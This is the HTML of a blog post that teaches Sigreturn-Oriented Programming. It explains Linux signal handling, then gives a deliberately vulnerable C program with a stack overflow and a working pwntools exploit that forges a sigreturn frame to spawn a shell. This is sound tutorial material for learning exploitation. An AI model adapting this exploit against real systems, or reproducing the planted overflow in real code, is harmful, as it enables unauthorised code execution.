@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Sig-Return Oriented Programming Attack (SROP) | BinaryChunk’s Blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Sig-Return Oriented Programming Attack (SROP)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This post covers yet another Binary Exploitation attack that is somewhat similar to return-oriented-programming (ROP) to understand how this works, we first need to understand Linux signals." />
+<meta property="og:description" content="This post covers yet another Binary Exploitation attack that is somewhat similar to return-oriented-programming (ROP) to understand how this works, we first need to understand Linux signals." />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/03/06/signreturn-oriented-programming.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/03/06/signreturn-oriented-programming.html" />
+<meta property="og:site_name" content="BinaryChunk’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-06T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Sig-Return Oriented Programming Attack (SROP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-06T00:00:00+00:00","datePublished":"2022-03-06T00:00:00+00:00","description":"This post covers yet another Binary Exploitation attack that is somewhat similar to return-oriented-programming (ROP) to understand how this works, we first need to understand Linux signals.","headline":"Sig-Return Oriented Programming Attack (SROP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2022/03/06/signreturn-oriented-programming.html"},"url":"http://0.0.0.0:4000/2022/03/06/signreturn-oriented-programming.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="BinaryChunk&apos;s Blog" />
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
+<style>
+@font-face {
+  font-family: 'Open Sans';
+  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
+       format('woff2');
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  font-stretch: 100%;
+}
+
+body {
+  font-family: 'Open Sans', sans-serif;
+  font-size: 11pt;
+}
+</style>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/ctfs/">CTFs</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Sig-Return Oriented Programming Attack (SROP)</h1>
+    <div class="post-meta">
+      <time class="dt-published" datetime="2022-03-06T00:00:00+00:00" itemprop="datePublished">
+        Mar 6, 2022
+      </time>
+    </div>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This post covers yet another Binary Exploitation attack that is somewhat similar to return-oriented-programming (ROP) to understand how this works, we first need to understand Linux signals.</p>
+
+<h3 id="linux-signals">Linux Signals</h3>
+
+<p>Each signal has a current disposition that is used to determine 
+how a process behaves when it is delivered a signal. The following
+is used to specify the default disposition for each signal.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Term : The default action is to terminate the process
+- Ign: The default action is to ignore the process	
+	
+- Core: This is used to ignore the process and dump core
+	(core dump file): Some of the signals, their default actions is 
+	to terminate and produce a core dump file. This is a file that contains 
+	an image of the process memory at the time of termination. This image
+	can be used in a debugger to inspect the state of the program at the time 
+	that it was terminated. 
+
+- Stop: This is used to stop the process	
+- Cont: This is used to continue the process if it is currently stopped
+</code></pre></div></div>
+
+<p>A process can therefore change the disposition of a signal using <code class="language-plaintext highlighter-rouge">sigaction()</code> and 
+<code class="language-plaintext highlighter-rouge">signal()</code>. A signal handler is a user-defined function that is executed when 
+a signal occurs and its stack frame is created on the current processes’ stack. It is also possible 
+to make the signal handler use an alternate stack using the <code class="language-plaintext highlighter-rouge">sigalstack()</code> syscall 
+as described in its man page.</p>
+
+<p>The following are some of the actions that take place during the execution 
+of sighandlers <em>(user defined functions)</em>. When there is a transition from kernel-mode to user-mode execution <em>(eg.
+return from a syscall)</em>, the kernel checks if there is a pending 
+unblocked signal for which the process has established a signal handler.</p>
+
+<p>If there is a pending signal, the following takes place:</p>
+
+<blockquote>
+  <p><em>(between the time when a signal is generated and when a signal is delivered
+	this is where we say that this is a pending signal).</em></p>
+</blockquote>
+
+<ul class="task-list">
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />The kernel performs the necessary preparatory steps for the 
+  execution of the signal handler.</p>
+  </li>
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />The signal is remove from the pending signals.</p>
+  </li>
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />If the signal was installed via <code class="language-plaintext highlighter-rouge">sigaction()</code> and the flag <code class="language-plaintext highlighter-rouge">SA_ONSTACK</code> was set, 
+    and an alternate stack is defined using <code class="language-plaintext highlighter-rouge">sigaltstack()</code> a new stack for the signal 
+is then installed in the specified memory region.</p>
+  </li>
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Otherwise, the kernel will construct a frame for the sighandler on our current 
+stack and will set the program counter <code class="language-plaintext highlighter-rouge">rip</code> for the process to 
+point to the first instruction of the sighandler function and 
+configures the return address for that function to point 
+to a piece of user-space code that is called the <code class="language-plaintext highlighter-rouge">signal trampoline</code></p>
+  </li>
+</ul>
+
+<blockquote>
+  <p><em>This is code that is used to transfer control from the kernel 
+back to user mode when a signal that had a handler installed is sent 
+to a process (signal trampoline).</em></p>
+</blockquote>
+
+<ul class="task-list">
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />The kernel now passes control back to the user-space and this is 
+where execution will start and the sighandler will be called and its code
+block executed.</p>
+  </li>
+  <li class="task-list-item">
+    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />When the signal handler returns, it passes control back to the signal 
+trampoline code and this now calls <code class="language-plaintext highlighter-rouge">sigreturn()</code> a syscall that uses the 
+information in the stack frame that was created by the kernel in <code class="language-plaintext highlighter-rouge">(step 1)</code> to restore
+the process back to how it was before the sighandler was called.</p>
+  </li>
+</ul>
+
+<p>When <code class="language-plaintext highlighter-rouge">sigreturn()</code> compeletes, the kernel then transfers control back to the 
+userspace and the process now recommenses its execution back to 
+the point where it was interrupted by the signal handler.</p>
+
+<p>The following is a quick <code class="language-plaintext highlighter-rouge">c</code> snippet that is used to showcase how this works. We 
+are going to use a signal disposition that will continue after execution.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">sighandler</span><span class="p">(</span><span class="kt">int</span> <span class="n">signum</span><span class="p">){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"This will be called when the sighandler executes"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+	<span class="k">struct</span> <span class="n">sigaction</span> <span class="n">act</span><span class="p">;</span>
+	<span class="n">act</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">sighandler</span><span class="p">;</span>
+		
+	<span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCONT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">act</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="n">kill</span><span class="p">(</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">SIGCONT</span><span class="p">);</span>
+	
+	<span class="n">puts</span><span class="p">(</span><span class="s">"I will be printed after execution"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Compiling and running the program, we can view the syscalls during execution using the 
+<code class="language-plaintext highlighter-rouge">strace</code> command, and from below before the <code class="language-plaintext highlighter-rouge">puts()</code> function is called we can see 
+<code class="language-plaintext highlighter-rouge">rt_sigreturn</code> syscall that returns the function back to where it commenced resulting
+to the output <code class="language-plaintext highlighter-rouge">I will be printed after execution</code></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">gdb</code> you can also set a breakpoint at <code class="language-plaintext highlighter-rouge">ret</code> opcode of the sighandler function and 
+examine the return address. If this was a normal function, the return address would
+we a function address, lets say an address somewhere at <code class="language-plaintext highlighter-rouge">main()</code> but this is a stack 
+address, showing evidence that the function returned to a <code class="language-plaintext highlighter-rouge">signal trampoline</code>.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>From what we have learned we can therefore use this to our advantage. This attack will 
+work by putting a forged <code class="language-plaintext highlighter-rouge">sigcontext struct</code> on the stack. This is a data structure that is 
+initiated by the kernel, when a sighandler is executed and it contains these 
+registers, pointers, flags etc.. used for restoration. After creating the forged <code class="language-plaintext highlighter-rouge">sigcontext structure</code>, we 
+overwrite the return address with the location of our syscall gadget <code class="language-plaintext highlighter-rouge">rt_sigreturn()</code>.</p>
+
+<p>After execution, the process will try to go back to its intial state trusting 
+the values from the sigcontext, restoring them and giving us control of the program
+(instruction and stack pointer).</p>
+
+<p>The following are some of the conditions for an SROP attack:</p>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />A buffer overlow vulnerablilty, to control the instruction pointer.</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Enough stack space to place <code class="language-plaintext highlighter-rouge">sigcontext struct</code> that is 128 bytes.</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />A syscall gadget to execute <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> syscall.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">binsh</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span> 
+
+<span class="c1">// gcc -o srop srop.c -no-pie -fno-stack-protector (compile flags)</span>
+
+<span class="kt">void</span> <span class="nf">syscall_function</span><span class="p">(){</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">"syscall; ret"</span><span class="p">);</span> <span class="c1">// syscall gadget</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">set_rax</span><span class="p">(){</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">"movl $0xf, %eax; ret;"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>	
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span> <span class="c1">// buffer overflow</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>From the above snippet we see that the binary meets all the conditions 
+that are required for an srop attack. Its now time for exploitation. We will 
+be using a simple python script for this.</p>
+
+<ol>
+  <li>First we need to locate our <code class="language-plaintext highlighter-rouge">syscall ret</code> gadget and <code class="language-plaintext highlighter-rouge">mov eax, 0xf</code> gadget.</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--file</span> srop <span class="nt">--search</span> <span class="s2">"syscall; ret"</span> <span class="o">&amp;&amp;</span> ropper <span class="nt">--file</span> srop <span class="nt">--search</span> <span class="s2">"mov eax, 0xf; ret"</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Second we find our offset located at <code class="language-plaintext highlighter-rouge">24</code> and using a simple 
+python script we write our payload. Python <code class="language-plaintext highlighter-rouge">pwntools</code> comes coupled with 
+a <code class="language-plaintext highlighter-rouge">sigreturnFrame()</code> that is used to model out <code class="language-plaintext highlighter-rouge">sigcontext struct</code>.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="s">"./srop"</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x401126</span>
+<span class="n">mov_eax</span> <span class="o">=</span> <span class="mh">0x401130</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x00402004</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="c1"># fill the buffer to saved RIP
+</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_eax</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1"># call rt_sigreturn()
+</span>
+        <span class="c1">#construct sigcontext frame and control the values of out registers
+</span>        <span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+        <span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="p">.</span><span class="n">SYS_execve</span> <span class="c1"># set rax to execve syscall
+</span>        <span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">binsh</span> <span class="c1"># set rdi to /bin/sh
+</span>        <span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+
+        <span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">payload</span>
+ 
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">())</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+
+
+</code></pre></div></div>
+
+<p>From the above exploit we get a full bash shell. There are more complex ways
+to chain <code class="language-plaintext highlighter-rouge">srop</code> attack but this all depends with your creativity.</p>
+
+<h3 id="references">References</h3>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />https://amriunix.com/post/sigreturn-oriented-programming-srop/</li>
+</ul>
+
+
+  </div>
+
+  <a class="u-url" href="/2022/03/06/signreturn-oriented-programming.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
+      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
+      <span class="grey fa-brands fa-github fa-lg"></span>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
